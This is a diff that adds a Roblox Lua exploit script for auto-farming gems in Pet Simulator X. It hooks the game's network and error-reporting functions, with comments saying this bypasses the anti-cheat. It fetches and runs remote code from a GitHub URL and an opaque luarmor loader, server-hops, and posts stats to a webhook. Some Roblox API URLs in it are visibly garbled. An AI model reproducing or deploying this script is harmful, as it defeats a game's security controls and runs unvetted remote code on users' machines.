@@ -1,0 +1,335 @@
+wait(5)
+WEBHOOK = "..webhook.." -- Paste your webhook here
+HttpService = game:GetService("HttpService")
+local TimeElapsed = 0
+local GemsEarned = 0
+local TotalGemsEarned = 0
+local timer = coroutine.create(function()
+    while 1 do
+        TimeElapsed = TimeElapsed + 1
+        wait(1)
+    end
+end)
+coroutine.resume(timer)
+AREATOCHECK = "Mystic Mine"
+function add_suffix(inte)
+    local gems = inte
+    local gems_formatted
+ 
+    if gems >= 1000000000000 then  -- if gems are greater than or equal to 1 trillion
+        gems_formatted = string.format("%.1ft", gems / 1000000000000)  -- display gems in trillions with one decimal point
+    elseif gems >= 1000000000 then  -- if gems are greater than or equal to 1 billion
+        gems_formatted = string.format("%.1fb", gems / 1000000000)  -- display gems in billions with one decimal point
+    elseif gems >= 1000000 then  -- if gems are greater than or equal to 1 million
+        gems_formatted = string.format("%.1fm", gems / 1000000)  -- display gems in millions with one decimal point
+    elseif gems >= 1000 then  -- if gems are greater than or equal to 1 thousand
+        gems_formatted = string.format("%.1fk", gems / 1000)  -- display gems in thousands with one decimal point
+    else  -- if gems are less than 1 thousand
+        gems_formatted = tostring(gems)  -- display gems as is
+    end
+ 
+    return gems_formatted
+end
+ 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ServerHop/ServerHop/main/ServerHop", true))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+ 
+function WH()
+	request({
+		Url = WEBHOOK,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode{
+            ["content"] = "",
+            ["embeds"] = {
+			    {
+			      ["title"] = "Server Hop Stat Update",
+			      ["description"] = "Successfully Broke Everything In Server. Hopping To New Server!",
+			      ["color"] = 5814783,
+			      ["fields"] = {
+			        {
+			          ["name"] = "Stats",
+			          ["value"] = ":clock1: **Time Taken:** ``"..TimeElapsed.."s``\n:gem: **Gems Earned:** ``"..add_suffix(GemsEarned).."``\n:map: **Farming:** ``"..AREATOCHECK.."``\n:gem: **Total Gems Earned:** ``"..add_suffix(TotalGemsEarned).."``"
+			        }
+			      },
+			      ["author"] = {
+			        ["name"] = "Mystic Farmer - Stats"
+			      }
+			    }
+			  }
+			  }
+	})
+end
+ 
+local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+local Deleted = false
+local File = pcall(function()
+    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+end)
+if not File then
+    table.insert(AllIDs, actualHour)
+    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+end
+function TPReturner()
+    local Site;
+    if foundAnything == "" then
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.comes/v1/gamessssss/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+    else
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.comes/v1/gamesssss/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+    end
+    local ID = ""
+    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+        foundAnything = Site.nextPageCursor
+    end
+    local num = 0;
+    for i,v in pairs(Site.data) do
+        local Possible = true
+        ID = tostring(v.id)
+        if tonumber(v.maxPlayers) > tonumber(v.playing) then
+            for _,Existing in pairs(AllIDs) do
+                if num ~= 0 then
+                    if ID == tostring(Existing) then
+                        Possible = false
+                    end
+                else
+                    if tonumber(actualHour) ~= tonumber(Existing) then
+                        local delFile = pcall(function()
+                            delfile("NotSameServers.json")
+                            AllIDs = {}
+                            table.insert(AllIDs, actualHour)
+                        end)
+                    end
+                end
+                num = num + 1
+            end
+            if Possible == true then
+                table.insert(AllIDs, ID)
+                wait()
+                pcall(function()
+                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                    wait()
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+                end)
+                wait(4)
+            end
+        end
+    end
+end
+ 
+function Teleport()
+    while wait() do
+        pcall(function()
+            TPReturner()
+            if foundAnything ~= "" then
+                TPReturner()
+            end
+        end)
+    end
+end
+ 
+local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+while not v1.Loaded do
+    game:GetService("RunService").Heartbeat:Wait();
+end;
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+local Fire, Invoke = Network.Fire, Network.Invoke
+ 
+-- Hooking the _check function in the module to bypass the anticheat.
+ 
+local old
+old = hookfunction(getupvalue(Fire, 1), function(...)
+   return true
+end)
+ 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local InputService = game:GetService('UserInputService')
+local RunService = game:GetService('RunService')
+local ContentProvider = game:GetService("ContentProvider")
+local banSuccess, banError = pcall(function() 
+		local Blunder = require(game:GetService("ReplicatedStorage"):WaitForChild("X", 10):WaitForChild("Blunder", 10):WaitForChild("BlunderList", 10))
+		if not Blunder or not Blunder.getAndClear then LocalPlayer:Kick("Error while bypassing the anti-cheat! (Didn't find blunder)") end
+ 
+		local OldGet = Blunder.getAndClear
+		setreadonly(Blunder, false)
+		local function OutputData(Message)
+		   print("-- PET SIM X BLUNDER --")
+		   print(Message .. "\n")
+		end
+ 
+		Blunder.getAndClear = function(...)
+		   local Packet = ...
+			for i,v in next, Packet.list do
+			   if v.message ~= "PING" then
+				   OutputData(v.message)
+				   table.remove(Packet.list, i)
+			   end
+		   end
+		   return OldGet(Packet)
+		end
+ 
+		setreadonly(Blunder, true)
+	end)
+ 
+	if not banSuccess then
+		LocalPlayer:Kick("Error while bypassing the anti-cheat! (".. banError ..")")
+		return
+	end
+ 
+	local Library = require(game:GetService("ReplicatedStorage").Library)
+	assert(Library, "Oopps! Library has not been loaded. Maybe try re-joining?") 
+	while not Library.Loaded do task.wait() end
+ 
+	Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	Humanoid = Character:WaitForChild("Humanoid")
+	HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+ 
+ 
+	local bypassSuccess, bypassError = pcall(function()
+		if not Library.Network then 
+			LocalPlayer:Kick("Network not found, can't bypass!")
+		end
+ 
+		if not Library.Network.Invoke or not Library.Network.Fire then
+			LocalPlayer:Kick("Network Invoke/Fire was not found! Failed to bypass!")
+		end
+ 
+		hookfunction(debug.getupvalue(Library.Network.Invoke, 1), function(...) return true end)
+		-- Currently we don't need to hook Fire, since both Invoke/Fire have the same upvalue, this may change in future.
+		-- hookfunction(debug.getupvalue(Library.Network.Fire, 1), function(...) return true end)
+ 
+		local originalPlay = Library.Audio.Play
+		Library.Audio.Play = function(...) 
+			if checkcaller() then
+				local audioId, parent, pitch, volume, maxDistance, group, looped, timePosition = unpack({ ... })
+				if type(audioId) == "table" then
+					audioId = audioId[Random.new():NextInteger(1, #audioId)]
+				end
+				if not parent then
+					warn("Parent cannot be nil", debug.traceback())
+					return nil
+				end
+				if audioId == 0 then return nil end
+ 
+				if type(audioId) == "number" or not string.find(audioId, "rbxassetid://", 1, true) then
+					audioId = "rbxassetid://" .. audioId
+				end
+				if pitch and type(pitch) == "table" then
+					pitch = Random.new():NextNumber(unpack(pitch))
+				end
+				if volume and type(volume) == "table" then
+					volume = Random.new():NextNumber(unpack(volume))
+				end
+				if group then
+					local soundGroup = game.SoundService:FindFirstChild(group) or nil
+				else
+					soundGroup = nil
+				end
+				if timePosition == nil then
+					timePosition = 0
+				else
+					timePosition = timePosition
+				end
+				local isGargabe = false
+				if not pcall(function() local _ = parent.Parent end) then
+					local newParent = parent
+					pcall(function()
+						newParent = CFrame.new(newParent)
+					end)
+					parent = Instance.new("Part")
+					parent.Anchored = true
+					parent.CanCollide = false
+					parent.CFrame = newParent
+					parent.Size = Vector3.new()
+					parent.Transparency = 1
+					parent.Parent = workspace:WaitForChild("__DEBRIS")
+					isGargabe = true
+				end
+				local sound = Instance.new("Sound")
+				sound.SoundId = audioId
+				sound.Name = "sound-" .. audioId
+				sound.Pitch = pitch and 1
+				sound.Volume = volume and 0.5
+				sound.SoundGroup = soundGroup
+				sound.Looped = looped and false
+				sound.MaxDistance = maxDistance and 100
+				sound.TimePosition = timePosition
+				sound.RollOffMode = Enum.RollOffMode.Linear
+				sound.Parent = parent
+				if not require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client")).Settings.SoundsEnabled then
+					sound:SetAttribute("CachedVolume", sound.Volume)
+					sound.Volume = 0
+				end
+				sound:Play()
+				getfenv(originalPlay).AddToGarbageCollection(sound, isGargabe)
+				return sound
+			end
+ 
+			return originalPlay(...)
+		end
+ 
+	end)
+ 
+	if not bypassSuccess then
+		print(bypassError)
+		LocalPlayer:Kick("Error while bypassing network, try again or wait for an update!")
+		return
+	end
+function FrTeleportToWorld(world, area)
+        local Library = require(game:GetService("ReplicatedStorage").Library)
+        Library.WorldCmds.Load(world)
+        wait(0.25)
+        local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(area)
+        Library.Signal.Fire("Teleporting")
+        task.wait(0.25)
+        local Character = game.Players.LocalPlayer.Character
+        local Humanoid = Character.Humanoid
+        local HumanoidRootPart = Character.HumanoidRootPart
+        Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+        Library.Network.Fire("Performed Teleport", area)
+        task.wait(0.25)
+end
+function FrTeleportToArea(world, area)
+    local Library = require(game:GetService("ReplicatedStorage").Library)
+    local areaTeleport = Library.WorldCmds.GetMap().Teleports:FindFirstChild(area)
+        local Character = game.Players.LocalPlayer.Character
+        local Humanoid = Character.Humanoid
+        local HumanoidRootPart = Character.HumanoidRootPart
+        Character:PivotTo(areaTeleport.CFrame + areaTeleport.CFrame.UpVector * (Humanoid.HipHeight + HumanoidRootPart.Size.Y / 2))
+        Library.Network.Fire("Performed Teleport", area)
+ 
+end
+ 
+local Library = require(game:GetService("ReplicatedStorage").Library)
+local StartingGems = Library.Save.Get().Diamonds
+ 
+while 1 do
+	wait(1)
+	cs = Invoke("Get Coins")
+	mm = {}
+	for i,v in pairs(cs) do
+		if v.a == AREATOCHECK then table.insert(mm, v) end
+	end
+	print(#mm)
+	if #mm <= 2 then
+		print("0")
+		local EndingGems = Library.Save.Get().Diamonds
+		GemsEarned = EndingGems - StartingGems
+		local fileContent = readfile("gems.txt")
+		if fileContent then
+	    	TotalGemsEarned = GemsEarned + tonumber(fileContent)
+		end
+		writefile("gems.txt", tostring(TotalGemsEarned))
+		WH()
+		Teleport()
+	end
+	mm = {}
+end
